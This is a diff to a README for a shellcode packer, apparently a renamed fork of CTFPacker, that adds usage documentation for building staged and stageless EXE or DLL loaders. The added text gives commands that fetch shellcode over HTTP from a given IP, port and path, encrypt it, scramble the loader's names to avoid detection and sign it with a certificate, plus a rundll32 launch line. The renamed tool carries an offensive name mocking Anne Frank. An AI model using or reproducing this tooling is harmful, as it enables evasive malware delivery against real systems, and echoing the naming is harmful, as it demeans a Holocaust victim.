@@ -154,13 +154,90 @@ python3 -m pip install .
 You should NOT modify the Makefile unless you know what you are doing! But check the compiler line like before.
 
 ## Usage
+## Usage
 
-General usage remains the same, just with the new name.
+General usage:
+```
+usage: main.py [-h] {staged,stageless} ...
 
-Staged & Stageless examples – copy the original command syntax but change "ctfloader" references to "annefrankinjector" in your head when it compiles.
+CTFPacker
 
-The DLL still exports ctf for compatibility, but now you can run it with:
-rundll32.exe annefrankinjector.dll,ctf
+positional arguments:
+  {staged,stageless}  Staged or Stageless Payloads
+    staged            Staged
+    stageless         Stageless
+
+options:
+  -h, --help          show this help message and exit
+```
+
+Staged:
+
+```
+usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+
+options:
+  -h, --help            show this help message and exit
+  -p PAYLOAD, --payload PAYLOAD
+                        Shellcode to be packed
+  -f {EXE,DLL}, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
+  -i IP_ADDRESS, --ip-address IP_ADDRESS
+                        IP address from where your shellcode is gonna be fetched.
+  -po PORT, --port PORT
+                        Port from where the HTTP connection is gonna fetch your shellcode.
+  -pa PATH, --path PATH
+                        Path from where your shellcode uis gonna be fetched.
+  -o OUTPUT, --output OUTPUT
+                        Output path where the shellcode is gonna be saved.
+  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble        Scramble the loader's functions and variables.
+  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
+
+Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+```
+
+Stageless:
+
+```
+usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+
+options:
+  -h, --help            show this help message and exit
+  -p PAYLOAD, --payload PAYLOAD
+                        Shellcode to be packed
+  -f {EXE,DLL}, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
+  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble        Scramble the loader's functions and variables.
+  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
+
+Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+```
+
+### Format option
+
+In both cases, staged or stageless, you can choose whether to compile your loader as an EXE or a DLL. To compile it as a DLL, simply append `-f DLL`. By default, it compiles as an EXE, though you can also explicitly specify this using -f EXE (but you don't need to).
+
+The DLL version exports a function called `ctf`. This is the function you need to call to start the exection. 
+
+```powershell
+rundll32.exe afinjector.dll,ctf
+```
+
+### Staged
+
+When using the staged "mode", the packer will generate you a .bin file named accordingly to your `-o` arg. With the `-pa` argument, you are actually telling the loader *where* on the websever (basically the path) it should search for that .bin file. So TLDR those two values should usually be the same.
+
+Example:
+
+```powershell
+python main.py staged -p "C:\Code\CTFPacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
+```
 
 
 ## To-Do
